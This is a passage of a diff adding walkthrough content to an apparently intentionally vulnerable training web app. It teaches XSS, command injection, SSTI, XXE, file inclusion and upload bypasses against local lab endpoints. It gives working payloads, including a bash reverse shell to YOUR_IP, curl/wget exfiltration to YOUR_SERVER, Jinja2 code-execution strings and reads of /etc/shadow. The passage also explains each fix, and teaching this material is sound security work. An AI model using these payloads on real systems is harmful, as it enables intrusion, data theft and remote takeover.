+                    <a href="/news#test" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-hash"></i> Go to News Page</a>
+                </div>
+                <p class="mt-3"><strong>Tip:</strong> DOM XSS is invisible to server-side WAFs. The payload stays in the browser.</p>`
+            ]
+        },
+        {
+            id: "xss-dom-welcome",
+            name: "DOM-Based XSS (Welcome Page)",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Let's practice finding DOM XSS systematically. Instead of being told where it is, let's discover it. Visit <a href="/welcome?name=YourName" target="_blank">/welcome?name=YourName</a> and open the page source (Ctrl+U).</p>
+                <p>Your job: search the JavaScript on this page for dangerous functions. Use Ctrl+F in the source and search for: <code>innerHTML</code>, <code>document.write</code>, <code>eval(</code>, <code>outerHTML</code>, <code>.html(</code>.</p>`,
+
+                `<p class="wt-mentor-text">You should find JavaScript that reads the <code>name</code> query parameter (that is the <strong>source</strong>) and passes it to <code>innerHTML</code> (that is the <strong>sink</strong>). The source-to-sink flow is the core concept of DOM XSS.</p>
+                <p>In the previous DOM XSS walkthrough, the source was <code>window.location.hash</code>. Here it is a URL query parameter. Common sources to look for: <code>location.hash</code>, <code>location.search</code>, <code>location.href</code>, <code>document.referrer</code>, <code>document.URL</code>, <code>window.name</code>, and <code>postMessage</code> data.</p>`,
+
+                `<p class="wt-mentor-text">You have identified the source and the sink. Now exploit it:</p>
+                <pre>/welcome?name=&lt;img src=x onerror=alert('DOM XSS')&gt;</pre>
+                <p>The query parameter value flows directly into innerHTML without any sanitization.</p>`,
+
+                `<p class="wt-mentor-text">The alert fires. Notice that if you check the server logs, this request looks completely normal - the server just sees <code>?name=...</code> and serves the static page. All the dangerous processing happens in the browser. That is what makes DOM XSS invisible to server-side security tools.</p>`,
+
+                `<p class="wt-mentor-text">Here is your DOM XSS hunting checklist for any page: (1) View source, search for sinks (<code>innerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>outerHTML</code>, jQuery's <code>.html()</code>). (2) For each sink, trace backwards - where does the data come from? (3) If the data comes from a user-controllable source (URL, hash, referrer), test it. This source-to-sink tracing is how professional JavaScript security auditors work.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/welcome?name=Hacker" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-hand-wave"></i> Go to Welcome Page</a>
+                </div>`
+            ]
+        },
+        {
+            id: "xss-stored-comment",
+            name: "Stored XSS (News Comments)",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Let's think about impact scale. With messages, you targeted one person. With reviews, you hit visitors to one product. Comments on news articles can reach the widest audience - everyone who reads the article.</p>
+                <p>Go to <a href="/news" target="_blank">News</a>, click into any article, and scroll down to find the comment form.</p>`,
+
+                `<p class="wt-mentor-text">Do the HTML canary test: submit a comment with <code>&lt;b&gt;bold test&lt;/b&gt;</code>. After it posts, check if "bold test" appears in bold. If yes, the comment is rendered as HTML.</p>
+                <p>Important distinction: if the bold text only appears in your own browser, that might just be "self-XSS" (you are only attacking yourself). To verify it is real stored XSS, open the same article in an incognito window or a different browser. If the bold text appears there too, it is stored and affects all visitors.</p>`,
+
+                `<p class="wt-mentor-text">Confirmed it is stored. Now post a comment with a real payload:</p>
+                <pre>&lt;script&gt;alert('XSS in comments')&lt;/script&gt;</pre>
+                <p>After posting, refresh the page. The alert should fire immediately. Now open that article URL in incognito - does the alert fire there too? That proves this is not self-XSS.</p>`,
+
+                `<p class="wt-mentor-text">The alert fires for every visitor who reads this article. Unlike the message XSS (targeted, 1:1), this is a broadcast attack. If this were a popular article, hundreds of users would get hit without you doing anything after the initial comment.</p>`,
+
+                `<p class="wt-mentor-text">The self-XSS vs stored XSS distinction matters for your report. Self-XSS (only you see it) is generally not accepted in bug bounties because you cannot attack anyone else with it. Stored XSS that fires for other users is a valid finding. Always verify by testing in a clean browser session. The "incognito test" takes five seconds and turns a rejected report into an accepted one.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/news" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-chat-dots"></i> Go to News</a>
+                </div>`
+            ]
+        }
+    ]
+},
+{
+    id: "cmdi",
+    name: "Command Injection",
+    icon: "bi-terminal",
+    badgeClass: "vuln-cmdi",
+    description: "Run system commands on the server through the web app.",
+    vulns: [
+        {
+            id: "cmdi-basic-ping",
+            name: "Basic Command Injection (Ping)",
+            difficulty: "Easy",
+            steps: [
+                `<p class="wt-mentor-text">When a web app runs system commands with your input, things get dangerous fast. Let's check the network tools.</p>
+                <p>Go to <a href="/tools/ping" target="_blank">Tools > Ping</a>.</p>`,
+
+                `<p class="wt-mentor-text">This tool pings an IP address. Under the hood, it is probably running something like <code>ping -c 2 YOUR_INPUT</code> on the server. If your input goes directly into a shell command, you can inject additional commands.</p>`,
+
+                `<p class="wt-mentor-text">Try these in the host field:</p>
+                <pre>127.0.0.1; whoami</pre>
+                <pre>127.0.0.1 | id</pre>
+                <pre>127.0.0.1 && cat /etc/passwd</pre>
+                <p>The semicolon, pipe, and <code>&&</code> all chain commands in a shell.</p>`,
+
+                `<p class="wt-mentor-text">You should see the ping output followed by the output of your injected command. <code>whoami</code> shows the server user, <code>id</code> shows groups, and <code>cat /etc/passwd</code> dumps system users.</p>`,
+
+                `<p class="wt-mentor-text">The backend runs: <code>subprocess.check_output(f"ping -c 2 {host}", shell=True)</code></p>
+                <p>The <code>shell=True</code> flag means the input is passed to a shell interpreter, which processes metacharacters like <code>;</code>, <code>|</code>, <code>&&</code>, backticks, and <code>$()</code>. The fix is to use <code>shell=False</code> with a list of arguments, or better yet, use a Python library for ping instead of shelling out.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/tools/ping" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-hdd-network"></i> Go to Ping Tool</a>
+                </div>
+                <p class="mt-3"><strong>Extra challenges:</strong></p>
+                <ul>
+                    <li>Can you get a reverse shell? Try <code>; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'</code></li>
+                    <li>Read files: <code>; cat /etc/shadow</code></li>
+                    <li>List directories: <code>; ls -la /</code></li>
+                </ul>`
+            ]
+        },
+        {
+            id: "cmdi-filtered-dns",
+            name: "Filtered Command Injection (DNS)",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">What if there is a filter? Let's check the DNS lookup tool.</p>
+                <p>Go to <a href="/tools/dns" target="_blank">Tools > DNS Lookup</a>.</p>`,
+
+                `<p class="wt-mentor-text">Try the same semicolon trick: <code>google.com; whoami</code>. Does it work? The developer might have added a filter.</p>
+                <p>Check what is being filtered. Semicolons might be blocked, but what about other shell metacharacters?</p>`,
+
+                `<p class="wt-mentor-text">The filter only removes semicolons. Try these alternatives:</p>
+                <pre>google.com | whoami</pre>
+                <pre>google.com && whoami</pre>
+                <pre>google.com || whoami</pre>
+                <pre>\`whoami\`</pre>
+                <pre>$(whoami)</pre>
+                <p>Pipe (<code>|</code>) and <code>&&</code> are not filtered and still work.</p>`,
+
+                `<p class="wt-mentor-text">The filter only catches one metacharacter. Your commands still execute through the other operators.</p>`,
+
+                `<p class="wt-mentor-text">Blocklist filtering is almost always bypassable. The code does <code>domain.replace(';', '')</code> which only removes semicolons. But shell has many ways to chain commands: pipes, AND/OR operators, backticks, dollar-sign subshells, newlines. Proper fix: never pass user input to a shell. Use the <code>dnspython</code> library instead of calling <code>nslookup</code>.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/tools/dns" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-globe"></i> Go to DNS Lookup</a>
+                </div>`
+            ]
+        },
+        {
+            id: "cmdi-blind-traceroute",
+            name: "Blind Command Injection (Traceroute)",
+            difficulty: "Hard",
+            steps: [
+                `<p class="wt-mentor-text">Sometimes you can inject commands but you do not see the output. This is blind command injection. Let's check traceroute.</p>
+                <p>Go to <a href="/tools/traceroute" target="_blank">Tools > Traceroute</a>.</p>`,
+
+                `<p class="wt-mentor-text">Try <code>127.0.0.1; whoami</code>. You might see the traceroute output but not the whoami output. The app might be using a method that discards command output, or only shows the traceroute part.</p>
+                <p>If you cannot see output, you need to detect the injection some other way.</p>`,
+
+                `<p class="wt-mentor-text">Use time-based detection. If the server sleeps, you know your command executed:</p>
+                <pre>127.0.0.1; sleep 5</pre>
+                <p>If the response takes 5 seconds longer than normal, you have blind command injection.</p>
+                <p>To exfiltrate data, use out-of-band techniques:</p>
+                <pre>127.0.0.1; curl http://YOUR_SERVER/$(whoami)</pre>
+                <pre>127.0.0.1; wget http://YOUR_SERVER/$(cat /etc/hostname)</pre>`,
+
+                `<p class="wt-mentor-text">The response delay confirms command execution. For data exfiltration, check your listener for incoming requests containing the command output in the URL path.</p>`,
+
+                `<p class="wt-mentor-text">Blind command injection is harder to detect but equally dangerous. The app uses <code>Popen</code> without capturing output, so results are invisible. Time-based and out-of-band techniques work around this. In a pentest, set up a Burp Collaborator or simple HTTP server to catch exfiltrated data.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/tools/traceroute" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-diagram-3"></i> Go to Traceroute</a>
+                </div>`
+            ]
+        }
+    ]
+},
+{
+    id: "ssti",
+    name: "Server-Side Template Injection",
+    icon: "bi-braces",
+    badgeClass: "vuln-ssti",
+    description: "Inject template expressions that execute on the server. Can lead to remote code execution.",
+    vulns: [
+        {
+            id: "ssti-greeting",
+            name: "SSTI in Greeting",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Template injection is like XSS but on the server side. Instead of browser JavaScript, you run server-side code. Let's find one.</p>
+                <p>Go to your <a href="/profile" target="_blank">Profile</a> and look for a greeting or personalization feature. There should be a link to a greeting page.</p>`,
+
+                `<p class="wt-mentor-text">The greeting page takes your name and renders it in a template. If the input goes directly into the template engine (Jinja2 in this case), you can inject template expressions.</p>
+                <p>Try entering <code>{{7*7}}</code> as your name. If the output shows <code>49</code> instead of the literal text, you have SSTI.</p>`,
+
+                `<p class="wt-mentor-text">First confirm with math: enter <code>{{7*7}}</code> in the greeting form.</p>
+                <p>Then escalate to reading server info:</p>
+                <pre>{{config}}</pre>
+                <p>And for remote code execution:</p>
+                <pre>{{self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read()}}</pre>`,
+
+                `<p class="wt-mentor-text"><code>{{7*7}}</code> returns <code>49</code>. <code>{{config}}</code> dumps the Flask config including secret keys. The RCE payload runs <code>whoami</code> on the server and returns the output.</p>`,
+
+                `<p class="wt-mentor-text">The app uses <code>render_template_string()</code> which processes user input as a Jinja2 template. The <code>{{ }}</code> syntax is evaluated by the template engine. Through Python's object introspection, you can navigate from any object to the <code>os</code> module and execute arbitrary commands. This is full remote code execution.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/profile/greeting" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-hand-wave"></i> Go to Greeting Page</a>
+                </div>
+                <p class="mt-3"><strong>Detection tip:</strong> Test <code>{{7*7}}</code> on every input. If you see <code>49</code>, you have SSTI.</p>`
+            ]
+        },
+        {
+            id: "ssti-report-gen",
+            name: "SSTI in Report Generator",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Where else might templates be used? Think about features that generate dynamic output: reports, invoices, certificates, export functions. Anything that produces formatted output from user data is a potential SSTI target.</p>
+                <p>Go to <a href="/reports/generate" target="_blank">Reports > Generate</a>. This feature creates reports, which almost certainly uses a template engine under the hood.</p>`,
+
+                `<p class="wt-mentor-text">Apply the SSTI detection pattern you just learned. Enter <code>{{7*7}}</code> in whatever text field the form offers. If the generated report shows <code>49</code>, the template engine is processing your input.</p>
+                <p>Also try Jinja2-specific syntax: <code>{%25 if 1 %}yes{%25 endif %}</code>. If you see "yes" in the output, that confirms Jinja2 specifically (not Twig, Mako, or another engine). Knowing the engine determines which payloads to use.</p>`,
+
+                `<p class="wt-mentor-text">Confirmed Jinja2 SSTI. Now let's escalate differently this time - instead of running <code>whoami</code>, read the application source code:</p>
+                <pre>{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /opt/bugbounty/thyhe/app.py').read()}}</pre>
+                <p>Or dump environment variables (often contain API keys and database credentials):</p>
+                <pre>{{config.items()}}</pre>
+                <p>Or list files in the app directory to find config files:</p>
+                <pre>{{self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /opt/bugbounty/thyhe/').read()}}</pre>`,
+
+                `<p class="wt-mentor-text">You can now read the entire application source code through the report generator. The <code>config.items()</code> payload dumps the Flask configuration, which includes the <code>SECRET_KEY</code> used to sign session cookies. With that key, you can forge any session - instant admin access without needing a password.</p>`,
+
+                `<p class="wt-mentor-text">Report generators are common in enterprise applications: HR systems generate employee reports, finance apps generate invoices, analytics tools generate dashboards. Any time you see "generate," "export," or "create report" in a business application, test for SSTI. The payload <code>{{7*7}}</code> takes two seconds to type and the impact is full remote code execution.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/reports/generate" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-file-earmark-text"></i> Go to Report Generator</a>
+                </div>`
+            ]
+        },
+        {
+            id: "ssti-email-preview",
+            name: "SSTI in Email Preview",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Email templates are one of the most common SSTI targets in real-world applications. Companies let users customize notification emails, marketing campaigns, or automated responses. The preview feature renders the template so you can see what it looks like before sending. If the preview passes your input through the template engine, you have SSTI.</p>
+                <p>Go to <a href="/reports/email-preview" target="_blank">Reports > Email Preview</a>.</p>`,
+
+                `<p class="wt-mentor-text">Before jumping to <code>{{7*7}}</code>, let's explore what is available in the template context. Jinja2 templates have access to certain objects by default. Try these one at a time to see what the application exposes:</p>
+                <pre>{{request}}</pre>
+                <pre>{{request.headers}}</pre>
+                <pre>{{session}}</pre>
+                <p>These show you the current HTTP request details and session data - information that might reveal other attack vectors.</p>`,
+
+                `<p class="wt-mentor-text">Now escalate. You have already seen the RCE payload work in the greeting and report generator. This time, use SSTI to read the application's own source code and find more vulnerabilities:</p>
+                <pre>{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /opt/bugbounty/thyhe/app.py | head -50').read()}}</pre>
+                <p>Or find database files:</p>
+                <pre>{{self.__init__.__globals__.__builtins__.__import__('os').popen('find / -name "*.db" 2>/dev/null').read()}}</pre>
+                <p>Reading the source code through SSTI gives you a complete map of every vulnerability in the application - SQL queries, hardcoded secrets, missing auth checks, everything.</p>`,
+
+                `<p class="wt-mentor-text">You now have full server access through an email preview feature. The source code reveals the database path, the SECRET_KEY, and every vulnerable query. This single SSTI gives you more information than all the other vulnerabilities combined.</p>`,
+
+                `<p class="wt-mentor-text">In real-world pentests, email template features are prime SSTI targets because: (1) they explicitly need template rendering, (2) non-technical users often control the template content (marketing teams, support teams), and (3) developers assume "it is just an email, what could go wrong?" Your takeaway: any time you see "customize," "template," "preview," or "personalize" in a feature, test for SSTI. The <code>{{7*7}}</code> probe takes two seconds, and the impact is full server compromise.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/reports/email-preview" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-envelope"></i> Go to Email Preview</a>
+                </div>`
+            ]
+        }
+    ]
+},
+{
+    id: "xxe",
+    name: "XML External Entity (XXE)",
+    icon: "bi-filetype-xml",
+    badgeClass: "vuln-xxe",
+    description: "Exploit XML parsers to read files and make server-side requests.",
+    vulns: [
+        {
+            id: "xxe-import",
+            name: "XXE via Report Import (Paste)",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">XXE attacks target XML parsers. If the app processes XML input and the parser resolves external entities, you can read files from the server.</p>
+                <p>Go to <a href="/reports/import" target="_blank">Reports > Import</a>. There should be a text area where you can paste XML.</p>`,
+
+                `<p class="wt-mentor-text">First, confirm the app accepts XML. Paste a simple valid XML document and submit. If it parses without error, the XML processor is active.</p>
+                <p>The key question is: does the parser resolve external entities? That is what makes XXE possible.</p>`,
+
+                `<p class="wt-mentor-text">Paste this XML:</p>
+                <pre>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;report&gt;
+  &lt;title&gt;&amp;xxe;&lt;/title&gt;
+  &lt;content&gt;test&lt;/content&gt;
+&lt;/report&gt;</pre>`,
+
+                `<p class="wt-mentor-text">The contents of <code>/etc/passwd</code> should appear in the title field of the parsed report. The XML parser read the file from the server and substituted it into the entity.</p>`,
+
+                `<p class="wt-mentor-text">The app uses lxml with <code>resolve_entities=True</code> and <code>load_dtd=True</code>. The <code>&lt;!ENTITY&gt;</code> declaration tells the parser to load an external resource (in this case, a local file). When the parser encounters <code>&amp;xxe;</code>, it replaces it with the file contents. You can read any file the web server process has permission to access.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/reports/import" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-filetype-xml"></i> Go to Report Import</a>
+                </div>
+                <p class="mt-3"><strong>Extra challenges:</strong></p>
+                <ul>
+                    <li>Read <code>/etc/shadow</code> (might need root permissions)</li>
+                    <li>Read app source: <code>file:///opt/bugbounty/thyhe/app.py</code></li>
+                    <li>Try SSRF: use <code>http://127.0.0.1:5000/internal/admin</code> as the entity URL</li>
+                </ul>`
+            ]
+        },
+        {
+            id: "xxe-upload",
+            name: "XXE via XML File Upload",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Pasting XML into a text box is one thing, but file uploads are where XXE hides in the real world. Any time an application accepts XML file uploads - data imports, config uploads, report templates - the XML parser on the backend might resolve external entities.</p>
+                <p>Go to <a href="/reports/import" target="_blank">Reports > Import</a> and look for the file upload option alongside the paste box.</p>`,
+
+                `<p class="wt-mentor-text">Let's walk through creating a malicious XML file. Open a terminal and create the file:</p>
+                <pre>cat > /tmp/evil.xml &lt;&lt;'EOF'
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;
+]&gt;
+&lt;report&gt;
+  &lt;title&gt;&amp;xxe;&lt;/title&gt;
+  &lt;content&gt;uploaded&lt;/content&gt;
+&lt;/report&gt;
+EOF</pre>
+                <p>The key is matching the XML structure the app expects. If it wants <code>&lt;report&gt;&lt;title&gt;&lt;content&gt;</code>, your malicious XML must follow that schema. The XXE entity declaration goes in the DOCTYPE before the document body.</p>`,
+
+                `<p class="wt-mentor-text">Upload <code>/tmp/evil.xml</code> through the form. The server parses the XML, resolves the entity, and the hostname appears in the title field of the imported report.</p>
+                <p>Now try reading something more sensitive - edit the file to target <code>file:///opt/bugbounty/thyhe/app.py</code> and re-upload. You are reading the application source code through a file upload feature.</p>`,
+
+                `<p class="wt-mentor-text">The file contents appear in the parsed output, same as the paste-based XXE. The delivery mechanism changed (file upload vs text box), but the underlying vulnerability is identical: the XML parser resolves external entities.</p>`,
+
+                `<p class="wt-mentor-text">Here is the key insight for your methodology: XML is everywhere, often in disguise. File formats that are secretly XML: SVG images (try uploading a malicious SVG to an avatar/image upload), DOCX/XLSX/PPTX (they are ZIP archives containing XML files - you can inject XXE into them), SOAP web services (the request body is XML), RSS/Atom feeds, and configuration files. Whenever you see a file upload, check what formats it accepts. If any format is XML-based, test for XXE.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/reports/import" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-upload"></i> Go to Report Import</a>
+                </div>`
+            ]
+        },
+        {
+            id: "xxe-api",
+            name: "XXE via API Endpoint",
+            difficulty: "Hard",
+            steps: [
+                `<p class="wt-mentor-text">APIs often accept XML. If you find an endpoint that takes XML in the request body, test it for XXE.</p>
+                <p>The API has a data import endpoint at <code>/api/v1/data/import</code>.</p>`,
+
+                `<p class="wt-mentor-text">Send an XML POST request with a Content-Type of <code>application/xml</code>. The API processes the XML body the same way as the web form.</p>`,
+
+                `<p class="wt-mentor-text">Use curl:</p>
+                <pre>curl -X POST http://localhost:5000/api/v1/data/import \\
+  -H "Content-Type: application/xml" \\
+  -d '&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;data&gt;&lt;item&gt;&amp;xxe;&lt;/item&gt;&lt;/data&gt;'</pre>`,
+
+                `<p class="wt-mentor-text">The API response includes the file contents. API-based XXE is the same vulnerability, just delivered via a different channel.</p>`,
+
+                `<p class="wt-mentor-text">When testing APIs, always check if they accept XML by changing the Content-Type header to <code>application/xml</code> or <code>text/xml</code>, even if the default is JSON. Many frameworks support both formats, and the XML parser might be misconfigured even if JSON is the primary format.</p>`,
+
+                `<div class="wt-try-box">
+                    <p>Test with curl in your terminal:</p>
+                    <pre>curl -X POST http://localhost:5000/api/v1/data/import -H "Content-Type: application/xml" -d '&lt;data&gt;&lt;item&gt;test&lt;/item&gt;&lt;/data&gt;'</pre>
+                </div>`
+            ]
+        }
+    ]
+},
+{
+    id: "lfi",
+    name: "File Inclusion (LFI/RFI)",
+    icon: "bi-folder-symlink",
+    badgeClass: "vuln-lfi",
+    description: "Read files from the server or include remote files through path traversal.",
+    vulns: [
+        {
+            id: "lfi-basic",
+            name: "Basic LFI (Document Viewer)",
+            difficulty: "Easy",
+            steps: [
+                `<p class="wt-mentor-text">Local File Inclusion lets you read files outside the intended directory. Let's check the document viewer.</p>
+                <p>Go to <a href="/documents" target="_blank">Documents</a> and view one of the available files.</p>`,
+
+                `<p class="wt-mentor-text">Look at the URL when viewing a document: <code>/documents/view?file=employee_handbook.txt</code>. That filename is being passed to the server, which reads it from a directory. What if you change the filename to point somewhere else?</p>`,
+
+                `<p class="wt-mentor-text">Try path traversal with <code>../</code> to go up directories:</p>
+                <pre>/documents/view?file=../admin_credentials.txt</pre>
+                <pre>/documents/view?file=../../../../../etc/passwd</pre>
+                <p>You need enough <code>../</code> to reach the target. The documents directory is nested, so you might need 4-5 levels.</p>`,
+
+                `<p class="wt-mentor-text">You should see the contents of <code>/etc/passwd</code> or the admin credentials file. You can now read any file on the server that the web process has access to.</p>`,
+
+                `<p class="wt-mentor-text">The app uses <code>os.path.join(DOCUMENTS_FOLDER, filename)</code> but does not validate that the resulting path stays within the intended directory. The <code>../</code> sequences traverse up the directory tree, escaping the documents folder. The fix is to check that the resolved path starts with the documents directory (using <code>os.path.realpath()</code> or similar).</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/documents" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-folder"></i> Go to Documents</a>
+                </div>
+                <p class="mt-3"><strong>High-value targets:</strong> <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>app.py</code> (source code), <code>.env</code>, <code>admin_credentials.txt</code></p>`,
+
+                `<p class="wt-mentor-text">ffuf with an LFI wordlist finds readable files fast.</p>
+                <pre>ffuf -u "http://localhost:5000/documents/view?file=FUZZ" \\
+  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \\
+  -H "Cookie: session=YOUR_SESSION" \\
+  -mc 200 -fr "Error reading"</pre>
+                <p><code>-fr "Error reading"</code> filters out responses containing that error string (files that do not exist return 200 with "Error reading file" in the body). Every response without that error is a readable file.</p>
+                <p>Or build your own targeted list:</p>
+                <pre>echo -e "../admin_credentials.txt\n../../../../../etc/passwd\n../../../../../etc/hostname\n../../../../../proc/self/environ" > /tmp/lfi.txt
+ffuf -u "http://localhost:5000/documents/view?file=FUZZ" \\
+  -w /tmp/lfi.txt \\
+  -H "Cookie: session=YOUR_SESSION" \\
+  -mc 200 -fr "Error reading"</pre>`
+            ]
+        },
+        {
+            id: "lfi-filter-bypass",
+            name: "LFI with Filter Bypass",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Some developers try to fix LFI by stripping <code>../</code> from the input. Let's see if their filter is any good.</p>
+                <p>There is a page viewer at <code>/pages?page=</code>.</p>`,
+
+                `<p class="wt-mentor-text">Try <code>/pages?page=../../../etc/passwd</code>. If it does not work but a normal page loads fine, there might be a filter removing the <code>../</code> sequences.</p>
+                <p>The question is: does the filter run recursively (keep removing until clean) or just once?</p>`,
+
+                `<p class="wt-mentor-text">If the filter runs only once, you can double-encode the traversal:</p>
+                <pre>/pages?page=....//....//....//....//etc/passwd</pre>
+                <p>When the filter removes <code>../</code> from <code>....//</code>, what is left is <code>../</code>. The filter cleaned it once but the result is still a traversal.</p>`,
+
+                `<p class="wt-mentor-text">The file loads. The non-recursive filter is bypassed by nesting the sequences so that removing the inner one produces a new traversal.</p>`,
+
+                `<p class="wt-mentor-text">The code does <code>page.replace('../', '')</code> which is a single-pass replacement. <code>....//</code> becomes <code>../</code> after one pass. This is why blocklist approaches fail. The secure fix is to resolve the path and check it against an allowed directory, not to try filtering malicious patterns.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/pages?page=about" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-file-text"></i> Go to Page Viewer</a>
+                </div>`
+            ]
+        },
+        {
+            id: "lfi-rfi",
+            name: "Remote File Inclusion (RFI)",
+            difficulty: "Hard",
+            steps: [
+                `<p class="wt-mentor-text">What if you can make the server load a file from your machine? That is Remote File Inclusion, and it is much more dangerous than LFI.</p>
+                <p>Check the resource loader at <code>/resources?src=</code>.</p>`,
+
+                `<p class="wt-mentor-text">Try a local file first: <code>/resources?src=employee_handbook.txt</code>. Now try a URL: <code>/resources?src=http://example.com</code>. If the server fetches external URLs, you have RFI.</p>`,
+
+                `<p class="wt-mentor-text">Host a malicious file on your machine:</p>
+                <pre>python3 -m http.server 8888</pre>
+                <p>Create a file and serve it. Then:</p>
+                <pre>/resources?src=http://YOUR_IP:8888/malicious.txt</pre>
+                <p>For LFI, also try:</p>
+                <pre>/resources?src=../../../../../etc/passwd</pre>`,
+
+                `<p class="wt-mentor-text">The server fetches your remote file and displays its contents. If this were a PHP app, you could include a remote PHP file and get code execution. Even without code execution, you can use this for SSRF to access internal services.</p>`,
+
+                `<p class="wt-mentor-text">The app uses <code>requests.get(resource)</code> when the source starts with <code>http</code>. This makes the server fetch any URL, which is both RFI and SSRF. For local files, it falls back to reading from the filesystem (LFI). This endpoint is a two-for-one vulnerability.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/resources?src=employee_handbook.txt" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-cloud-download"></i> Go to Resource Loader</a>
+                </div>`
+            ]
+        }
+    ]
+},
+{
+    id: "upload",
+    name: "Insecure File Upload",
+    icon: "bi-cloud-upload",
+    badgeClass: "vuln-upload",
+    description: "Bypass file upload restrictions to upload malicious files.",
+    vulns: [
+        {
+            id: "upload-client-side",
+            name: "Client-Side Only Validation",
+            difficulty: "Easy",
+            steps: [
+                `<p class="wt-mentor-text">File uploads with only client-side validation are basically unprotected. Let's find one.</p>
+                <p>Go to <a href="/documents" target="_blank">Documents</a> and find the upload feature.</p>`,
+
+                `<p class="wt-mentor-text">Try uploading a <code>.txt</code> file. It works. Now try a <code>.php</code> file. Does it get rejected? Look at the page source to see if the validation is in JavaScript.</p>
+                <p>If the check is only in JavaScript, you can bypass it by disabling JavaScript or intercepting the request.</p>`,
+
+                `<p class="wt-mentor-text">Option 1: Disable JavaScript in your browser and submit the form normally.</p>
+                <p>Option 2: Intercept the upload in Burp Suite and change the filename from <code>safe.txt</code> to <code>shell.php</code>.</p>
+                <p>Option 3: Use curl, which ignores client-side validation entirely:</p>
+                <pre>curl -X POST http://localhost:5000/documents/upload -F "file=@shell.php" -b "session=YOUR_COOKIE"</pre>`,
+
+                `<p class="wt-mentor-text">The file uploads successfully. Client-side validation was the only check, and we bypassed it completely.</p>`,
+
+                `<p class="wt-mentor-text">Client-side validation (JavaScript) is for user experience, not security. It can always be bypassed because the attacker controls the client. All security checks must happen on the server. Never rely on JavaScript validation for file type, size, or content checks.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/documents" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-upload"></i> Go to Documents Upload</a>
+                </div>`
+            ]
+        },
+        {
+            id: "upload-mime",
+            name: "MIME Type Check Bypass",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Some uploads check the Content-Type header. But you control that header.</p>
+                <p>Look for the avatar upload at <a href="/profile/edit" target="_blank">Profile Edit</a>.</p>`,
+
+                `<p class="wt-mentor-text">Try uploading a non-image file. The server might reject it because the Content-Type is not <code>image/jpeg</code> or <code>image/png</code>. But who sets the Content-Type? Your browser does, and you can change it.</p>`,
+
+                `<p class="wt-mentor-text">Create a file called <code>shell.php</code> with malicious content. Upload it using Burp:</p>
+                <p>1. Intercept the upload request</p>
+                <p>2. Change the <code>Content-Type</code> from <code>application/x-php</code> to <code>image/jpeg</code></p>
+                <p>3. Forward the modified request</p>
+                <p>Or with curl:</p>
+                <pre>curl -X POST http://localhost:5000/profile/avatar -F "avatar=@shell.php;type=image/jpeg" -b "session=YOUR_COOKIE"</pre>`,
+
+                `<p class="wt-mentor-text">The file uploads because the server trusts the Content-Type header, which you faked. A PHP file is now stored on the server with an image MIME type.</p>`,
+
+                `<p class="wt-mentor-text">Checking only the Content-Type header is insufficient because it is set by the client. Proper validation checks the file contents (magic bytes), the file extension, and ideally processes the file through a library (like Pillow for images) to verify it is actually the claimed type.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/profile/edit" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-person-circle"></i> Go to Profile Edit</a>
+                </div>`
+            ]
+        },
+        {
+            id: "upload-blocklist",
+            name: "Extension Blocklist Bypass",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">The support ticket attachment feature blocks certain extensions. But blocklists always have gaps.</p>
